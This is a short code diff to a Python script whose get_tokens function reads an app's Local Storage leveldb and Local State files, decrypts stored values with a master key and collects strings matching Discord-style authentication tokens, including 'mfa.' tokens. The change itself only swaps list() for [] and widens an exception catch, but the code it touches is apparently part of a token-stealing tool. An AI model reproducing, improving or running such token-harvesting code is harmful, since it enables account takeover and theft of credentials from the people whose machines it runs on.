@@ -51,9 +51,9 @@ def decrypt_token(buff, master_key):
 
 
 def get_tokens(path):
-    cleaned = list()
-    tokens = list()
-    done = list()
+    cleaned = []
+    tokens = []
+    done = []
     lev_db = path + "\\Local Storage\\leveldb\\"
     loc_state = path + "\\Local State"
     # new method with encryption
@@ -90,7 +90,7 @@ def get_tokens(path):
                     for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                         for token in re.findall(regex, line):
                             done.append(token)
-            except PermissionError:
+            except:
                 continue
 
     return done
